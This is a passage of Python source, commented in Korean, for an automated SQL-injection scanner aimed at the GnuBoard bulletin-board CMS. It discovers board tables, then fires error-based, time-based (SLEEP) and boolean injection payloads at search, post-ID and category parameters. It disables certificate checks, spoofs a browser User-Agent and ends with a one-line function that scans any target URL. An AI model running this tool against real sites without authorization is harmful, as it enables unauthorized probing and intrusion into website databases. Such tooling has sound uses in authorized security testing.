    # 실제 SQL 에러 패턴 (GnuBoard 일반 오류와 구별)
    REAL_SQL_ERRORS = [
        r"you have an error in your sql syntax",
        r"1064 .*sql syntax",
        r"mysql_fetch_array.*expects",
        r"ORA-\d{5}:",
        r"pg_query\(\).*error",
        r"unclosed quotation mark",
        r"column count doesn.t match value count",
        r"extractvalue\(1,",       # extractvalue 에러 리플렉션
        r"~[^~]{1,50}~",           # ~ 사이 데이터 추출 성공 패턴
        r"XPATH syntax error",
    ]

    # GnuBoard 일반 오류 (SQLi 아님 — 이것에 속으면 오탐)
    GNUBOARD_NORMAL_ERRORS = [
        "존재하지 않는 게시판",
        "게시물이 없습니다",
        "잘못된 접근",
        "정상적인 접근이 아닙니다",
        "접근 권한이 없습니다",
        "로그인 후 이용하세요",
        "올바른 경로로",
    ]

    def __init__(self, base_url: str, timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        requests.packages.urllib3.disable_warnings()
        self.results: list[dict] = []

    def _is_real_sql_error(self, body: str) -> str:
        """실제 SQL 에러인지 판별. GnuBoard 기본 오류 페이지는 제외."""
        body_lower = body.lower()

        # 먼저 그누보드 일반 오류 페이지인지 확인
        for normal_err in self.GNUBOARD_NORMAL_ERRORS:
            if normal_err in body:
                return ""  # 일반 오류 → SQLi 아님

        # 실제 SQL 에러 패턴 확인
        for pat in self.REAL_SQL_ERRORS:
            m = re.search(pat, body, re.I)
            if m:
                return m.group(0)[:120]
        return ""

    def _baseline_response(self, url: str) -> tuple[int, int, str]:
        """
        정상 응답 기준선 획득.
        반환: (status_code, content_length, snippet)
        """
        try:
            r = self.session.get(url, timeout=self.timeout)
            return r.status_code, len(r.text), r.text[:200]
        except Exception:
            return 0, 0, ""

    def _time_based_confirm(self, url: str, n: int = 3) -> tuple[float, float]:
        """
        시간기반 주입 3회 측정으로 신뢰도 향상.

        실전 교훈: 1회 측정은 네트워크 지연으로 오탐 가능.
        3회 중 2회 이상 3초 이상 지연 시 취약점으로 판정.
        반환: (측정값들의 중앙값, 기준 응답시간)
        """
        times = []
        for _ in range(n):
            t0 = time.time()
            try:
                self.session.get(url, timeout=15)
            except Exception:
                pass
            times.append(time.time() - t0)
            time.sleep(0.5)

        times.sort()
        median = times[len(times) // 2]
        return median, times[0]  # (중앙값, 최솟값)

    def scan_board(self, bo_table: str) -> list[dict]:
        """
        실제 존재하는 bo_table에 대해 SQLi 스캔.

        중요: GnuboardBotableDiscovery.discover()로 확인된 bo_table만 입력.
        """
        board_url = f"{self.base}/bbs/board.php?bo_table={bo_table}"
        results = []

        # 1. 검색어 파라미터 (stx) — 가장 자주 취약
        results.extend(self._test_stx(bo_table))

        # 2. 글 번호 파라미터 (wr_id)
        results.extend(self._test_wr_id(bo_table))

        # 3. 검색 옵션 파라미터
        results.extend(self._test_sca(bo_table))

        return results

    def _test_stx(self, bo_table: str) -> list[dict]:
        """stx (검색어) 파라미터 SQLi 테스트"""
        results = []
        base_url = f"{self.base}/bbs/board.php?bo_table={bo_table}&act=search&stx="
        base_status, base_len, base_snippet = self._baseline_response(
            base_url + "test"
        )
        if base_status == 0:
            return results

        # Error-based
        for payload in ["'", '"', "' OR '1'='1", "' AND '1'='2"]:
            import urllib.parse
            url = base_url + urllib.parse.quote(payload)
            try:
                r = self.session.get(url, timeout=self.timeout)
                evidence = self._is_real_sql_error(r.text)
                if evidence:
                    results.append({
                        "type": "error_based",
                        "param": "stx",
                        "url": url,
                        "payload": payload,
                        "evidence": evidence,
                        "confidence": "high",
                    })
                    return results  # 확인됨, 더 이상 테스트 불필요
            except Exception:
                continue

        # Time-based (3회 확인)
        import urllib.parse
        sleep_payload = "' AND SLEEP(3)-- -"
        sleep_url = base_url + urllib.parse.quote(sleep_payload)
        median_t, min_t = self._time_based_confirm(sleep_url, n=3)
        if median_t >= 2.8:
            results.append({
                "type": "time_based",
                "param": "stx",
                "url": sleep_url,
                "payload": sleep_payload,
                "evidence": f"3회 측정 중앙값: {median_t:.1f}s (기준: {min_t:.1f}s)",
                "confidence": "high" if median_t >= 3.5 else "medium",
            })

        # Boolean-based (응답 크기 비교)
        import urllib.parse
        true_url = base_url + urllib.parse.quote("test' AND '1'='1")
        false_url = base_url + urllib.parse.quote("test' AND '1'='2")
        try:
            r_true = self.session.get(true_url, timeout=self.timeout)
            r_false = self.session.get(false_url, timeout=self.timeout)
            # 크기 차이 > 50바이트 AND 정상 응답 대비 명확한 차이
            diff = abs(len(r_true.text) - len(r_false.text))
            if diff > 50 and r_true.status_code == r_false.status_code:
                # 추가 확인: 두 결과가 모두 "게시판 오류"가 아니어야 함
                if not any(e in r_true.text for e in self.GNUBOARD_NORMAL_ERRORS):
                    results.append({
                        "type": "boolean_based",
                        "param": "stx",
                        "url": true_url,
                        "payload": "test' AND '1'='1 vs AND '1'='2",
                        "evidence": f"True: {len(r_true.text)}B vs False: {len(r_false.text)}B (차이: {diff}B)",
                        "confidence": "medium",
                    })
        except Exception:
            pass

        return results

    def _test_wr_id(self, bo_table: str) -> list[dict]:
        """wr_id (글 번호) 파라미터 SQLi 테스트"""
        results = []
        # 먼저 유효한 wr_id 찾기 (1~5 시도)
        valid_wr_id = None
        for wid in range(1, 6):
            url = f"{self.base}/bbs/view.php?bo_table={bo_table}&wr_id={wid}"
            try:
                r = self.session.get(url, timeout=8)
                if r.status_code == 200 and "wr_id" in r.text:
                    valid_wr_id = wid
                    break
            except Exception:
                continue

        if valid_wr_id is None:
            return results

        base_url = f"{self.base}/bbs/view.php?bo_table={bo_table}&wr_id="
        import urllib.parse

        # Error-based
        for payload in [f"{valid_wr_id}'", f"{valid_wr_id}' AND '1'='1"]:
            url = base_url + urllib.parse.quote(payload)
            try:
                r = self.session.get(url, timeout=self.timeout)
                evidence = self._is_real_sql_error(r.text)
                if evidence:
                    results.append({
                        "type": "error_based",
                        "param": "wr_id",
                        "url": url,
                        "payload": payload,
                        "evidence": evidence,
                        "confidence": "high",
                    })
                    return results
            except Exception:
                continue

        return results

    def _test_sca(self, bo_table: str) -> list[dict]:
        """sca (카테고리) 파라미터 SQLi 테스트"""
        results = []
        import urllib.parse

        # sca는 상대적으로 드문 취약점이므로 error-based만 시도
        for payload in ["'", "' OR '1'='1"]:
            url = f"{self.base}/bbs/board.php?bo_table={bo_table}&sca={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=self.timeout)
                evidence = self._is_real_sql_error(r.text)
                if evidence:
                    results.append({
                        "type": "error_based",
                        "param": "sca",
                        "url": url,
                        "payload": payload,
                        "evidence": evidence,
                        "confidence": "high",
                    })
                    return results
            except Exception:
                continue

        return results

    def scan_site_search(self) -> list[dict]:
        """사이트 전체 검색 엔드포인트 SQLi 테스트"""
        results = []
        import urllib.parse

        # 그누보드 전체 검색 URL
        search_urls = [
            f"{self.base}/bbs/search.php?stx=",
            f"{self.base}/search.php?stx=",
            f"{self.base}/bbs/search.php?sfl=wr_subject&stx=",
        ]

        for base_url in search_urls:
            try:
                r_check = self.session.get(base_url + "test", timeout=8)
                if r_check.status_code != 200:
                    continue
            except Exception:
                continue

            for payload in ["'", "' OR '1'='1"]:
                url = base_url + urllib.parse.quote(payload)
                try:
                    r = self.session.get(url, timeout=self.timeout)
                    evidence = self._is_real_sql_error(r.text)
                    if evidence:
                        results.append({
                            "type": "error_based",
                            "param": "stx (global search)",
                            "url": url,
                            "payload": payload,
                            "evidence": evidence,
                            "confidence": "high",
                        })
                        return results
                except Exception:
                    continue

        return results

    def full_scan(self) -> dict:
        """
        그누보드 전체 SQLi 스캔 워크플로우.

        순서:
          1. bo_table 자동 발견 (실제 존재 확인)
          2. 각 게시판 stx/wr_id/sca 파라미터 테스트
          3. 사이트 전체 검색 테스트
        """
        discovery = GnuboardBotableDiscovery(self.base, self.timeout)

        report = {
            "target": self.base,
            "bo_tables_found": [],
            "bo_tables_tested": [],
            "vulnerabilities": [],
            "summary": "",
        }

        # 1. 실제 존재하는 bo_table 발견
        valid_tables = discovery.discover()
        report["bo_tables_found"] = valid_tables

        if not valid_tables:
            report["summary"] = "bo_table 미발견 — 전체 검색만 테스트"
            # 사이트 전체 검색 SQLi
            site_results = self.scan_site_search()
            report["vulnerabilities"].extend(site_results)
            return report

        # 2. 각 게시판 테스트 (최대 3개)
        for table in valid_tables[:3]:
            report["bo_tables_tested"].append(table)
            vulns = self.scan_board(table)
            report["vulnerabilities"].extend(vulns)

        # 3. 사이트 전체 검색
        site_results = self.scan_site_search()
        report["vulnerabilities"].extend(site_results)

        # 요약
        n = len(report["vulnerabilities"])
        if n > 0:
            types = list(set(v["type"] for v in report["vulnerabilities"]))
            report["summary"] = f"취약점 {n}개 발견: {', '.join(types)}"
        else:
            report["summary"] = "SQLi 미발견"

        return report


def scan_gnuboard_sqli(target_url: str) -> dict:
    """그누보드 SQLi 전체 스캔 원라이너"""
    return GnuboardSqliScanner(target_url).full_scan()


def discover_bo_tables(target_url: str) -> list[str]:
    """그누보드 bo_table 목록만 발견"""
    return GnuboardBotableDiscovery(target_url).discover()
